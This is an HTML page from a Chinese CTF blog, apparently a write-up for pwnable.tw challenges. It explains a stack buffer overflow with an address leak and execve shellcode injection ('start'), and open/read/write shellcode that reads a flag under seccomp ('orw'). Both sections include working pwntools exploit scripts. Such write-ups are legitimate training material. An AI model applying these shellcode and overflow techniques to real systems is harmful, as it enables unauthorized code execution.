@@ -1,0 +1,350 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
+  
+  <title>『pwnable』刷题记录_WP | C_LBY&#39;s BLOG</title>
+  <meta name="author" content="鎏柏鱼">
+  
+  <meta name="description" content="pwnable.tw 持续更新">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="『pwnable』刷题记录_WP"/>
+  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 『pwnable』刷题记录_WP</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<div class="alert alert-success description">
+										<i class="fa fa-info-circle"></i> pwnable.tw 持续更新
+									</div> <!-- alert -->
+									
+
+										<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>pwnable的题挺好玩的，就是难度可能偏高，但是可以练基本功，知道自己的弱项在哪里，所以写WP来做刷题记录。</p>
+<h3 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01 start"></a>0x01 start</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这篇WP在距离第一次做这题之后一个多月时间又修改了一次，不同的是，这段时间我学了一点汇编，才发现自己之前做题还是处于很懵懂的状态。其实这道题很有意思，程序是用汇编写的，短小精悍，32位无保护。IDA有点无助，如果不熟悉汇编，可以用动调来看发生了什么。从代码上来看，就是两次系统调用，然后就会退出。第一个系统调用显然是write，第二个IDA看不出来，但是从系统调用号（al寄存器处)可以看出来是read函数。</p>
+<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\pwnable_wp\start_ida.png" alt="start_ida"></p>
+<p>在准备write之前，程序总共push了6次，第一次是把esp中的地址放到了栈上，然后是_exit函数的地址，接下来连续push五次放的是字符串到栈上。我们知道，每push一次sp寄存器就会自动减一个字长。接下来程序把esp的地址作为起始地址然后打印20个字节，刚好对应五次push的内容。所以如果我们定义字符串最后一个字符的地址是buf，那么esp一开始的地址就是buf+0x1C。</p>
+<p>打印完之后ecx中的内容没变，紧接着就read60个字节。也就是说程序从buf处开始输入60字节，有溢出，因为此时buf距离ret地址只有 0x14。注意，这里和平时我们常接触的C语言编译的程序不太一样，它没有ebp的存在（整个程序都没出现），所以那个offset _exit其实就是返回地址了。我们又知道，ret完后sp寄存器会自动加一个字长，所以ret完后sp寄存器刚好指向一开始写esp值的栈地址。显然这个地址也是个栈地址，所以我们可以控制执行流，让程序返回到0x8048087处更新ecx后打印，这样我们就泄露了栈地址了。</p>
+<p>栈地址有什么用呢？整个程序很简单，也没有后门，也没有libc这一说，所以只能通过syscall来getshell，但是又没有足够的gadget来控制寄存器，所以考虑写shellcode。正好，程序没开NX保护。shellcode只能写到栈上，所以我们需要栈地址。上一步打印完后，程序直接从当前esp处开始输入。但是这里要注意，输入完之后程序依然会执行<code>add esp,14h</code>和<code>retn</code>，所以我们需要利用这个retn返回到shellcode处。所以输入的60字节就被这个ret地址切割成了20字节和36字节。我们很难找到少于20字节的shellcode，所以shellcode要写在24个字节之后。别忘了我们接收到的地址在当前esp的地址还要+4，所以我们要返回的地址是接收到的地址再+20就行了。</p>
+<p>如果不确定我们接收到的地址到底是哪，可以动调看看，然后手算一下。</p>
+<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\pwnable_wp\start_gdb.png" alt="start_gdb"></p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./start&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;chall.pwnable.tw&quot;, 10000)</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch_gdb</span>():</span><br><span class="line">    context.terminal == [<span class="string">&#x27;xdce4-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb()</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(write_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">buf_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(buf_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02 orw"></a>0x02 orw</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\pwnable_wp\orw_ida.png" alt="orw_ida"></p>
+<p>程序十分简单，32位，就是开了一个沙盒，然后读取shellcode后执行。题目也已经提示了要用orw。我们直接用seccomp-tools查看沙盒都开了些什么。</p>
+<p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\pwnable_wp\orw_seccomp.png" alt="orw_seccomp"></p>
+<p>开了些白名单，可以用这些函数，也就是说其他的用不了。程序中read函数可以输入200字节，所以直接使用pwntools的shellcraft工具来生成shellcode就行。&amp;shellcode位于bss段，我们读取的flag也可以存在bss段，注意不要和shellcode有冲突就行。</p>
+<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x804A060</span>+<span class="number">200</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># print(len(asm(shellcode))) #72</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-calc"><a href="#0x03-calc" class="headerlink" title="0x03 calc"></a>0x03 calc</h3><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5>
+											<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
+        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
+    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
+</div>
+							</div>
+
+							
+									
+										<span data-path="/2024/03/05/pwnable-WP/">
+											<em class="post-meta-item-text"> Page View <i
+													class="waline-pageview-count"></i></em>
+										</span>
+
+										
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/02/glibc-unsortedbin/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+											
+													
+														<section id="comments" class="comments">
+															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+  var walineConfig = 
+    walineConfig.el='#waline';
+  Waline.init(walineConfig);
+</script> -->
+
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+  init({
+    enable: true,
+    el: '#waline',
+    serverURL: 'https://blog-s-comment-three.vercel.app',
+    dark: true,
+    pageview: true,
+    lang: 'zh-CN',
+    requiredMeta: ['nick', 'mail'],
+    locale:
+      { placeholder: 'Say something……' },
+    highlighter: true,
+    search: false,
+    emoji: [
+      '//unpkg.com/@waline/emojis@1.2.0/weibo',
+      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
+      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
+      'https://unpkg.com/@waline/emojis@1.2.0/qq',
+    ],
+    imageUploader: false,
+  });
+</script>
+														</section>
+														
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+					
+						<div id="side_meta">
+							<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/WP/">WP<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>5</span></a></li> <li><a href="/tags/PWN/">PWN<span>5</span></a></li> <li><a href="/tags/WP/">WP<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-article-text">0x00 前言</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x01-start"><span class="toc-article-text">0x01 start</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x02-orw"><span class="toc-article-text">0x02 orw</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#EXP-1"><span class="toc-article-text">EXP</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x03-calc"><span class="toc-article-text">0x03 calc</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-article-text">分析</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+
+
+						</div>
+
+						
+
+			</div><!-- row -->
+
+			<!--
+ -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+    &copy; 2024
+      鎏柏鱼's Blog
+        
+                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
+                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
